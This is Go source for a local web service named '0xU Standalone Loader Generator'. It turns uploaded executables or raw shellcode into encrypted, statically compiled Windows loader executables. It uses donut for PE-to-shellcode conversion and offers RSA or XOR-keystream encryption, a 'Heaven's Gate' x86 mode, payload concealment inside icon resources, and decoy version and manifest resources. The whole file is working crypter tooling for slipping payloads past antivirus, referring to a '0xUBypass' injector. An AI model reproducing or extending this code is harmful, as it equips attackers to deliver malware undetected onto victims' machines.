package main

import (
	"crypto/sha256"
	_ "embed"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

//go:embed ui.html
var uiHTML []byte

func main() {
	port := "9090"
	if p := os.Getenv("PORT"); p != "" {
		port = p
	}

	http.HandleFunc("/", serveUI)
	http.HandleFunc("/api/generate", handleGenerate)
	http.HandleFunc("/api/status", handleStatus)

	log.Printf("0xU Standalone Loader Generator")
	log.Printf("http://127.0.0.1:%s", port)
	log.Fatal(http.ListenAndServe("127.0.0.1:"+port, nil))
}

func serveUI(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write(uiHTML)
}

func handleStatus(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	gpp := findGpp()
	donut := findDonutExe()
	windres := ""
	if gpp != "" {
		windres = findWindres(gpp)
	}
	missing := []string{}
	if gpp == "" {
		missing = append(missing, "g++ (MinGW)")
	}
	if donut == "" {
		missing = append(missing, "donut.exe")
	}
	if windres == "" {
		missing = append(missing, "windres")
	}
	json.NewEncoder(w).Encode(map[string]interface{}{
		"ready":   gpp != "",
		"gpp":     gpp != "",
		"donut":   donut != "",
		"windres": windres != "",
		"missing": missing,
	})
}

func handleGenerate(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	if r.Method == http.MethodOptions {
		return
	}
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if err := r.ParseMultipartForm(32 << 20); err != nil {
		jsonError(w, "failed to parse form: "+err.Error(), http.StatusBadRequest)
		return
	}
	file, _, err := r.FormFile("file")
	if err != nil {
		jsonError(w, "no file uploaded", http.StatusBadRequest)
		return
	}
	defer file.Close()

	mode := r.FormValue("mode")
	if mode == "" {
		mode = "x64"
	}
	embedKey := r.FormValue("embed_key") == "true"
	encryption := r.FormValue("encryption")
	if encryption == "" {
		encryption = "rsa"
	}

	inputData, err := io.ReadAll(file)
	if err != nil {
		jsonError(w, "failed to read uploaded file", http.StatusInternalServerError)
		return
	}

	var gpp string
	if mode == "x86" {
		gpp = findGpp32()
		if gpp == "" {
			jsonError(w, "32-bit MinGW g++ (i686-w64-mingw32-g++) not found", http.StatusInternalServerError)
			return
		}
	} else {
		gpp = findGpp()
		if gpp == "" {
			jsonError(w, "MinGW g++ not found", http.StatusInternalServerError)
			return
		}
	}

	tmpDir, err := os.MkdirTemp("", "0xu-standalone-*")
	if err != nil {
		jsonError(w, "failed to create temp directory", http.StatusInternalServerError)
		return
	}
	defer os.RemoveAll(tmpDir)

	var buildLog []string
	logStep := func(msg string) {
		buildLog = append(buildLog, msg)
		log.Printf("[0xU] %s", msg)
	}

	var shellcode []byte
	isPE := len(inputData) >= 2 && inputData[0] == 'M' && inputData[1] == 'Z'
	if isPE {
		donutExe := findDonutExe()
		if donutExe == "" {
			jsonError(w, "donut.exe not found", http.StatusInternalServerError)
			return
		}
		inputPath := filepath.Join(tmpDir, "input.exe")
		if err := os.WriteFile(inputPath, inputData, 0644); err != nil {
			jsonError(w, "failed to write input file", http.StatusInternalServerError)
			return
		}
		logStep(fmt.Sprintf("Received PE file (%d bytes)", len(inputData)))
		donutArch := "2"
		if mode == "x86" {
			donutArch = "1"
		}
		shellcodePath := filepath.Join(tmpDir, "shellcode.bin")
		donutCmd := exec.Command(donutExe, "-i", inputPath, "-o", shellcodePath, "-a", donutArch, "-f", "1", "-b", "3", "-e", "1")
		donutCmd.Dir = tmpDir
		donutOut, err := donutCmd.CombinedOutput()
		if err != nil {
			logStep("Donut failed: " + string(donutOut))
			jsonError(w, "donut conversion failed: "+err.Error(), http.StatusInternalServerError)
			return
		}
		shellcode, err = os.ReadFile(shellcodePath)
		if err != nil || len(shellcode) == 0 {
			jsonError(w, "donut produced no output", http.StatusInternalServerError)
			return
		}
		logStep(fmt.Sprintf("Donut: %d bytes PE -> %d bytes shellcode (arch=%s)", len(inputData), len(shellcode), mode))
	} else {
		shellcode = inputData
		logStep(fmt.Sprintf("Received raw shellcode (%d bytes)", len(shellcode)))
	}

	if len(shellcode) == 0 {
		jsonError(w, "shellcode is empty", http.StatusBadRequest)
		return
	}
	if len(shellcode) > 4*1024*1024 {
		jsonError(w, fmt.Sprintf("shellcode too large (%d bytes, max 4MB)", len(shellcode)), http.StatusBadRequest)
		return
	}

	var (
		loaderCpp       string
		privateKey      string
		srcFilesNeeded  []string
		cppFiles        []string
		callbackPayload []byte
		icoRCLines      string
	)

	if encryption == "ecl" {
		if mode == "callback" {
			key := eclGenerateKey()
			privateKey = key
			compressed, cErr := deflateCompress(shellcode)
			if cErr != nil {
				jsonError(w, "DEFLATE compression failed: "+cErr.Error(), http.StatusInternalServerError)
				return
			}
			logStep(fmt.Sprintf("DEFLATE: %d bytes -> %d bytes (%.1f%%)", len(shellcode), len(compressed), float64(len(compressed))*100/float64(len(shellcode))))
			logStep("Generating ECL key (SHA256-chain key stream)...")
			encoded := eclEncodeDirect(compressed, key)
			logStep(fmt.Sprintf("ECL direct: %d bytes -> %d bytes (XOR 1:1)", len(compressed), len(encoded)))
			loaderCpp = oxuGenerateLoaderEclCallback(encoded, len(encoded), len(shellcode), key, embedKey)
			callbackPayload = encoded
		} else {
			key := eclGenerateKey()
			privateKey = key
			logStep("Generating ECL key (SHA256-chain key stream)...")
			if mode == "x86" {
				encodedData := eclEncode(shellcode, key)
				logStep(fmt.Sprintf("ECL encoded: %d bytes -> %d bytes (sub64 2:1)", len(shellcode), len(encodedData)))
				loaderCpp = oxuGenerateLoaderEclX86(encodedData, len(encodedData), len(shellcode), key, embedKey)
				srcFilesNeeded = []string{"WindowsShellcodeInjector.cpp", "WindowsShellcodeInjector.h"}
			} else {
				encodedData := eclEncode(shellcode, key)
				logStep(fmt.Sprintf("ECL encoded: %d bytes -> %d bytes (sub64 2:1)", len(shellcode), len(encodedData)))
				loaderCpp = oxuGenerateLoaderEclX64(encodedData, len(encodedData), len(shellcode), key, embedKey)
			}
		}
		cppFiles = []string{filepath.Join(tmpDir, "main.cpp")}
		if mode == "x86" {
			cppFiles = append(cppFiles, filepath.Join(tmpDir, "WindowsShellcodeInjector.cpp"))
		}
	} else {
		logStep("Generating RSA keypair (64-bit primes)...")
		_, privKey, e, _, n, err := oxuGenerateKeyPair()
		if err != nil {
			jsonError(w, "RSA keypair generation failed: "+err.Error(), http.StatusInternalServerError)
			return
		}
		privateKey = privKey
		logStep("RSA keypair generated successfully")

		paddedLen := len(shellcode)
		if paddedLen%oxuBlockSize != 0 {
			paddedLen = ((paddedLen / oxuBlockSize) + 1) * oxuBlockSize
		}
		encrypted := oxuEncryptShellcode(shellcode, e, n)
		logStep(fmt.Sprintf("RSA encrypted: %d bytes -> %d bytes", len(shellcode), len(encrypted)))

		if mode == "x86" {
			loaderCpp = oxuGenerateLoaderX86(encrypted, len(encrypted), paddedLen, privKey, embedKey)
			srcFilesNeeded = []string{"RSA.cpp", "RSA.h", "mini-gmp.cpp", "mini-gmp.h", "mini-gmpxx.h",
				"WindowsShellcodeInjector.cpp", "WindowsShellcodeInjector.h"}
		} else if mode == "callback" {
			loaderCpp = oxuGenerateLoaderRsaCallback(encrypted, len(encrypted), paddedLen, privKey, embedKey)
			srcFilesNeeded = []string{"RSA.cpp", "RSA.h", "mini-gmp.cpp", "mini-gmp.h", "mini-gmpxx.h"}
			callbackPayload = encrypted
		} else {
			loaderCpp = oxuGenerateLoaderX64(encrypted, len(encrypted), paddedLen, privKey, embedKey)
			srcFilesNeeded = []string{"RSA.cpp", "RSA.h", "mini-gmp.cpp", "mini-gmp.h", "mini-gmpxx.h"}
		}

		cppFiles = []string{
			filepath.Join(tmpDir, "main.cpp"),
			filepath.Join(tmpDir, "RSA.cpp"),
			filepath.Join(tmpDir, "mini-gmp.cpp"),
		}
		if mode == "x86" {
			cppFiles = append(cppFiles, filepath.Join(tmpDir, "WindowsShellcodeInjector.cpp"))
		}
	}

	if err := os.WriteFile(filepath.Join(tmpDir, "main.cpp"), []byte(loaderCpp), 0644); err != nil {
		jsonError(w, "failed to write main.cpp", http.StatusInternalServerError)
		return
	}

	if len(srcFilesNeeded) > 0 {
		srcDir := find0xUBypassDir()
		if srcDir == "" {
			jsonError(w, "0xUBypass source directory not found (needed for RSA/x86 mode)", http.StatusInternalServerError)
			return
		}
		for _, f := range srcFilesNeeded {
			data, err := os.ReadFile(filepath.Join(srcDir, f))
			if err != nil {
				jsonError(w, fmt.Sprintf("failed to read %s: %v", f, err), http.StatusInternalServerError)
				return
			}
			if err := os.WriteFile(filepath.Join(tmpDir, f), data, 0644); err != nil {
				jsonError(w, fmt.Sprintf("failed to write %s: %v", f, err), http.StatusInternalServerError)
				return
			}
		}
	}
	logStep("Wrote loader source files")

	if mode == "callback" && callbackPayload != nil {
		sizes := pickIconTier(len(callbackPayload))
		maxCap := iconPayloadCapForSizes(sizes) * len(iconGroupNames)
		if len(callbackPayload) > maxCap {
			jsonError(w, fmt.Sprintf("payload too large for icon storage (%d bytes, max %d bytes)", len(callbackPayload), maxCap), http.StatusBadRequest)
			return
		}
		icoFiles := generatePayloadIcons(callbackPayload)
		var rcLines strings.Builder
		for i, ico := range icoFiles {
			fname := iconGroupNames[i] + ".ico"
			if err := os.WriteFile(filepath.Join(tmpDir, fname), ico, 0644); err != nil {
				jsonError(w, "failed to write "+fname, http.StatusInternalServerError)
				return
			}
			rcLines.WriteString(fmt.Sprintf("%d ICON \"%s\"\n", i+1, fname))
		}
		icoRCLines = rcLines.String()
		logStep(fmt.Sprintf("Embedded %d bytes payload across %d icon group(s) (32bpp RGBA, sizes %v)", len(callbackPayload), len(icoFiles), sizes))
	}

	windres := findWindres(gpp)
	if windres == "" && mode == "callback" && icoRCLines != "" {
		jsonError(w, "windres not found; required for callback mode icon resources", http.StatusInternalServerError)
		return
	}
	if windres != "" {
		manifestPath := filepath.Join(tmpDir, "app.manifest")
		os.WriteFile(manifestPath, []byte(manifestXML), 0644)
		rcContent := versionRC + "\n" + stringTableRC + "\n1 24 \"app.manifest\"\n"
		if mode == "callback" && icoRCLines != "" {
			rcContent = icoRCLines + "\n" + rcContent
		}
		rcPath := filepath.Join(tmpDir, "version.rc")
		if err := os.WriteFile(rcPath, []byte(rcContent), 0644); err == nil {
			resPath := filepath.Join(tmpDir, "version.o")
			wrCmd := exec.Command(windres, rcPath, "-O", "coff", "-o", resPath)
			wrCmd.Dir = tmpDir
			if wrOut, wrErr := wrCmd.CombinedOutput(); wrErr == nil {
				cppFiles = append(cppFiles, resPath)
				logStep("Added PE resources (.rsrc)")
			} else {
				if mode == "callback" && icoRCLines != "" {
					jsonError(w, "windres failed for icon resources: "+string(wrOut), http.StatusInternalServerError)
					return
				}
				logStep("windres skipped: " + string(wrOut))
			}
		}
	}

	outputExe := filepath.Join(tmpDir, "0xu_loader.exe")
	compileArgs := []string{"-O2", "-s", "-static", "-I" + tmpDir}
	if mode == "callback" {
		compileArgs = []string{"-O2", "-s", "-mwindows", "-municode", "-static",
			"-Wl,--major-subsystem-version,6", "-Wl,--minor-subsystem-version,1",
			"-Wl,--stack,0x100000",
			"-I" + tmpDir}
	}
	compileArgs = append(compileArgs, cppFiles...)
	compileArgs = append(compileArgs, "-o", outputExe)
	if mode == "callback" {
		compileArgs = append(compileArgs, "-lole32", "-lmfplat")
	}

	compileCmd := exec.Command(gpp, compileArgs...)
	compileCmd.Dir = tmpDir
	compileOut, err := compileCmd.CombinedOutput()
	if err != nil {
		logStep("Compilation failed: " + string(compileOut))
		jsonError(w, "compilation failed: "+string(compileOut), http.StatusInternalServerError)
		return
	}

	encLabel := "RSA"
	if encryption == "ecl" {
		encLabel = "ECL"
	}
	archLabel := "x64"
	if mode == "x86" {
		archLabel = "x86 (Heaven's Gate)"
	} else if mode == "callback" {
		archLabel = "x64 Callback"
	}
	logStep(fmt.Sprintf("Compiled 0xU loader (%s, %s, static)", encLabel, archLabel))

	outputData, err := os.ReadFile(outputExe)
	if err != nil {
		jsonError(w, "failed to read compiled output", http.StatusInternalServerError)
		return
	}
	hash := sha256.Sum256(outputData)
	logStep(fmt.Sprintf("Output: %d bytes, SHA256: %s", len(outputData), hex.EncodeToString(hash[:])))

	if embedKey {
		logStep("Key embedded in binary, double-click to run")
	} else {
		logStep(fmt.Sprintf("Usage: 0xu_loader.exe '%s'", privateKey))
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"data":        base64.StdEncoding.EncodeToString(outputData),
		"hash":        hex.EncodeToString(hash[:]),
		"private_key": privateKey,
		"build_log":   buildLog,
		"mode":        mode,
		"embed_key":   embedKey,
		"encryption":  encryption,
	})
}

func jsonError(w http.ResponseWriter, message string, code int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	json.NewEncoder(w).Encode(map[string]string{"error": message})
}

func findDonutExe() string {
	exePath, _ := os.Executable()
	exeDir := filepath.Dir(exePath)
	candidates := []string{
		filepath.Join(exeDir, "donut.exe"),
		filepath.Join(exeDir, "tools", "donut", "donut.exe"),
		filepath.Join(exeDir, "..", "tools", "donut", "donut.exe"),
		filepath.Join(exeDir, "..", "..", "tools", "donut", "donut.exe"),
		filepath.Join(".", "tools", "donut", "donut.exe"),
		filepath.Join("..", "tools", "donut", "donut.exe"),
	}
	for _, p := range candidates {
		if _, err := os.Stat(p); err == nil {
			abs, _ := filepath.Abs(p)
			return abs
		}
	}
	if p, err := exec.LookPath("donut.exe"); err == nil {
		return p
	}
	return ""
}

func findGpp() string {
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData != "" {
		clionGpp := filepath.Join(localAppData, "Programs", "CLion", "bin", "mingw", "bin", "g++.exe")
		if _, err := os.Stat(clionGpp); err == nil {
			return clionGpp
		}
	}
	for _, name := range []string{"g++.exe", "x86_64-w64-mingw32-g++.exe", "g++"} {
		if p, err := exec.LookPath(name); err == nil {
			return p
		}
	}
	return ""
}

func findGpp32() string {
	for _, name := range []string{"i686-w64-mingw32-g++.exe", "i686-w64-mingw32-g++"} {
		if p, err := exec.LookPath(name); err == nil {
			return p
		}
	}
	msys2Paths := []string{
		`C:\msys64\mingw32\bin\g++.exe`,
		`C:\tools\mingw32\bin\g++.exe`,
	}
	for _, p := range msys2Paths {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	return ""
}

func findWindres(gppPath string) string {
	dir := filepath.Dir(gppPath)
	base := filepath.Base(gppPath)
	windresName := strings.Replace(base, "g++", "windres", 1)
	for _, name := range []string{windresName, "windres.exe"} {
		p := filepath.Join(dir, name)
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	if p, err := exec.LookPath("windres.exe"); err == nil {
		return p
	}
	return ""
}

func find0xUBypassDir() string {
	exePath, _ := os.Executable()
	exeDir := filepath.Dir(exePath)
	candidates := []string{
		filepath.Join(exeDir, "0xUBypass"),
		filepath.Join(".", "0xUBypass"),
		filepath.Join(exeDir, "..", "shellcode-loader-0xU", "0xUBypass"),
		filepath.Join("..", "shellcode-loader-0xU", "0xUBypass"),
	}
	for _, p := range candidates {
		if _, err := os.Stat(filepath.Join(p, "RSA.cpp")); err == nil {
			abs, _ := filepath.Abs(p)
			return abs
		}
	}
	return ""
}
